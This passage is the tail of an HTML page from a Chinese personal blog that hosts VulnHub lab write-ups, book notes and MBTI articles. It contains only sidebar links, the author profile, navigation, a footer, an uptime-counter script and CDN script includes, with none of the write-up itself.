href="/2023/07/01/VULNHUB/149%20DURIAN/" rel="bookmark" title="VULNHUB DURIAN">VULNHUB DURIAN</a></li><li><a href="/2023/07/01/VULNHUB/130%20MOMENTUM2/" rel="bookmark" title="VULNHUB MOMENTUM2">VULNHUB MOMENTUM2</a></li><li><a href="/2023/07/01/VULNHUB/133%20GROTESQUE3/" rel="bookmark" title="VULNHUB GROTESQUE3">VULNHUB GROTESQUE3</a></li><li><a href="/2023/07/01/VULNHUB/135%20HACKABLE3/" rel="bookmark" title="VULNHUB HACKABLE3">VULNHUB HACKABLE3</a></li><li><a href="/2023/07/01/VULNHUB/141%20CENGBOX3/" rel="bookmark" title="VULNHUB CENGBOX3">VULNHUB CENGBOX3</a></li><li><a href="/2023/07/01/VULNHUB/147%20WARZONE3/" rel="bookmark" title="VULNHUB WARZONE3">VULNHUB WARZONE3</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt=".N1h1l157"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">.N1h1l157</p>
+  <div class="description" itemprop="description">人生如逆旅，我亦是行人</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">153</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">6</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">39</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL04xaDFsMTU3" title="https:&#x2F;&#x2F;github.com&#x2F;N1h1l157"><i class="ic i-github"></i></span>
+      <span class="exturl item twitter" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9YVDcyNzgwMzA4" title="https:&#x2F;&#x2F;twitter.com&#x2F;XT72780308"><i class="ic i-twitter"></i></span>
+      <span class="exturl item weibo" data-url="aHR0cHM6Ly9tLndlaWJvLmNuL3Byb2ZpbGUvNTgyOTg0MzUyNQ==" title="https:&#x2F;&#x2F;m.weibo.cn&#x2F;profile&#x2F;5829843525"><i class="ic i-weibo"></i></span>
+      <span class="exturl item about" data-url="aHR0cHM6Ly90Lm1lL24xaDFsMTU3" title="https:&#x2F;&#x2F;t.me&#x2F;n1h1l157"><i class="ic i-address-card"></i></span>
+      <span class="exturl item email" data-url="bWFpbHRvOjEyMjgwNTc4NjlAcXEuY29t" title="mailto:1228057869@qq.com"><i class="ic i-envelope"></i></span>
+      <span class="exturl item facebook" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDA4NDUzNzQwNTEzNw==" title="https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100084537405137"><i class="ic i-facebook"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-clipboard"></i>书架</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/books/LITERATURE/" rel="section"><i class="ic i-fedora"></i>LITERATURE</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/books/VULNHUB/" rel="section"><i class="ic i-android"></i>X_T-VULNHUB</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/books/XIAODI/" rel="section"><i class="ic i-opera"></i>XIAODI-SAFE</a>
+  </li>
+
+  </ul>
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2023/07/01/VULNHUB/149%20DURIAN/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2023/07/01/VULNHUB/148%20GITROOT/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
+</div>
+
+    <span><a href="/2023/07/01/BOOK/34%E3%80%8A%E6%9C%88%E4%BA%AE%E5%92%8C%E5%85%AD%E4%BE%BF%E5%A3%AB%E3%80%8B%E6%AF%9B%E5%A7%86/" title="《月亮和六便士》毛姆">《月亮和六便士》毛姆</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
+</div>
+
+    <span><a href="/2023/07/01/BOOK/37%E3%80%8A%E6%97%A0%E5%90%8D%E7%9A%84%E8%A3%98%E5%BE%B7%E3%80%8B%E6%89%98%E9%A9%AC%E6%96%AF%C2%B7%E5%93%88%E4%BB%A3/" title="《无名的裘德》托马斯·哈代">《无名的裘德》托马斯·哈代</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+</div>
+
+    <span><a href="/2023/04/01/MBTI/INFP%E8%A7%A3%E8%AF%BB/" title="INFP解读">INFP解读</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+</div>
+
+    <span><a href="/2023/04/01/MBTI/ESTP%E8%A7%A3%E8%AF%BB/" title="ESTP解读">ESTP解读</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+</div>
+
+    <span><a href="/2023/04/02/MBTI/%E8%87%AA%E6%88%91%E4%B8%8E%E5%8A%A8%E6%9C%BA/" title="自我与动机">自我与动机</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%B0%8F%E8%AF%B4/" title="分类于 小说">小说</a>
+</div>
+
+    <span><a href="/2023/07/01/BOOK/22%E3%80%8A%E4%BA%BA%E6%80%A7%E7%9A%84%E5%BC%B1%E7%82%B9%E3%80%8B%E6%88%B4%E5%B0%94%C2%B7%E5%8D%A1%E8%80%90%E5%9F%BA/" title="《人性的弱点》戴尔·卡耐基">《人性的弱点》戴尔·卡耐基</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2023/07/01/BOOK/60%E3%80%8A%E9%87%91%E9%A9%B4%E8%AE%B0%E3%80%8B%E9%98%BF%E6%99%AE%E5%88%97%E4%B9%8C%E6%96%AF/" title="《金驴记》阿普列乌斯">《金驴记》阿普列乌斯</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+</div>
+
+    <span><a href="/2023/04/01/MBTI/%E7%90%86%E6%83%B3%E5%8F%A6%E4%B8%80%E5%8D%8A/" title="理想另一半">理想另一半</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2023/07/01/VULNHUB/106%20SYMFONOS/" title="VULNHUB 6 SYMFONOS">VULNHUB 6 SYMFONOS</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2023/07/01/VULNHUB/150%20POWERGRID/" title="VULNHUB POWERGRID">VULNHUB POWERGRID</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">.N1h1l157 @ Phut Hon</span>
+  </div>
+
+<!--   自定义开启一个网站的运行时间 -->
+  <div class="site-uptime">
+    Site uptime: <span id="site-uptime"></span>
+  </div>
+  <script>
+    var siteUptimeElement = document.getElementById('site-uptime');
+    var siteSetupDate = new Date('2023-03-18'); // 替换为您的网站具体创建日期，格式为 'YYYY-MM-DD'
+    setInterval(function() {
+      var currentTime = new Date();
+      var uptime = formatUptime(currentTime - siteSetupDate);
+      siteUptimeElement.textContent = uptime;
+    }, 1000);
+
+    function formatUptime(milliseconds) {
+      var seconds = Math.floor(milliseconds / 1000);
+      var minutes = Math.floor(seconds / 60);
+      var hours = Math.floor(minutes / 60);
+      var days = Math.floor(hours / 24);
+
+      var uptime = '';
+      if (days > 0) {
+        uptime += days + '天 ';
+      }
+      if (hours > 0) {
+        uptime += (hours % 24) + '时 ';
+      }
+      if (minutes > 0) {
+        uptime += (minutes % 60) + '分 ';
+      }
+      uptime += (seconds % 60) + '秒';
+
+      return uptime;
+    }
+  </script>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2023/07/01/VULNHUB/150 POWERGRID/',
+    favicon: {
+      show: "Cryp71c3",
+      hide: "十年磨一剑"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
